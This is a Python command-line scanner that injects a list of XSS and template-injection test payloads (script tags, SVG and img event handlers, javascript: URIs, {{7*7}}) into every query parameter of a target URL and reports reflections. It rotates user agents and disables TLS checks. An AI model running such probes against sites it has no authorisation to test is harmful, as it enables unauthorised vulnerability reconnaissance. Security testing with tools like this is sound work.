# language: Python 3, file: xss_probe.py, target: Windows/Linux
# Context-aware Async XSS & Polyglot Injection Probe.

import asyncio
import argparse
import json
import random
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Any

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
]

PAYLOADS: List[Dict[str, str]] = [
    {"name": "HTML Injection", "payload": "<script>alert(1)</script>"},
    {"name": "Attribute Breakout", "payload": '"><script>alert(1)</script>'},
    {"name": "SVG Event", "payload": "<svg onload=alert(1)>"},
    {"name": "Img Onerror", "payload": "<img src=x onerror=alert(1)>"},
    {"name": "JS URI", "payload": "javascript:alert(1)"},
    {"name": "SSTI Jinja2/EL", "payload": "{{7*7}}"},
    {"name": "SSTI ES6", "payload": "${7*7}"},
]

class XSSProbe:
    def __init__(self, target_url: str, timeout: float = 10.0):
        import httpx
        self.httpx = httpx
        self.target_url = target_url
        self.timeout = timeout
        self.parsed = urlparse(target_url)
        self.base_url = urlunparse(self.parsed._replace(query=''))
        self.params = {k: v[0] for k, v in parse_qs(self.parsed.query).items()}
        self.findings = []

    async def probe_param(self, client, param_name: str):
        for item in PAYLOADS:
            p_name = item["name"]
            payload = item["payload"]
            
            test_params = dict(self.params)
            test_params[param_name] = payload
            url = f"{self.base_url}?{urlencode(test_params)}"
            
            try:
                r = await client.get(url, headers={"User-Agent": random.choice(USER_AGENTS)}, follow_redirects=True)
                body = r.text
                
                # Check for raw payload reflection or SSTI evaluation (49)
                reflected = payload in body
                ssti_eval = (payload in ["{{7*7}}", "${7*7}"]) and ("49" in body)
                
                if reflected or ssti_eval:
                    result = {
                        "param": param_name,
                        "type": "SSTI" if ssti_eval else p_name,
                        "payload": payload,
                        "url": url,
                        "reflected": reflected,
                        "evaluated": ssti_eval
                    }
                    self.findings.append(result)
                    print(f"[+] [VULN {result['type']}] Param: '{param_name}' | Payload: '{payload}'")
            except Exception:
                pass

    async def run(self) -> List[Dict[str, Any]]:
        if not self.params:
            print("[!] No parameters found in URL.")
            return []

        print(f"[*] Base URL: {self.base_url}")
        print(f"[*] Parameters to test: {list(self.params.keys())}\n")

        async with self.httpx.AsyncClient(verify=False, timeout=self.timeout) as client:
            tasks = [self.probe_param(client, param) for param in self.params]
            await asyncio.gather(*tasks)

        return self.findings

def main():
    parser = argparse.ArgumentParser(description="Async XSS & SSTI Probe")
    parser.add_argument("-u", "--url", required=True, help="Target URL with parameters (e.g. http://site.com/page?q=test)")
    parser.add_argument("--timeout", type=float, default=10.0, help="HTTP request timeout")
    parser.add_argument("-o", "--output", help="Save findings to JSON file")

    args = parser.parse_args()

    try:
        import httpx
    except ImportError:
        print("[!] Missing required library 'httpx'. Install via: pip install httpx")
        sys.exit(1)

    probe = XSSProbe(args.url, args.timeout)
    results = asyncio.run(probe.run())

    print(f"\n[+] Probing finished. Identified {len(results)} potential XSS/SSTI reflections.")

    if args.output:
        with open(args.output, 'w') as f:
            json.dump({"url": args.url, "findings": results}, f, indent=2)
        print(f"[+] Saved findings to {args.output}")

if __name__ == "__main__":
    main()
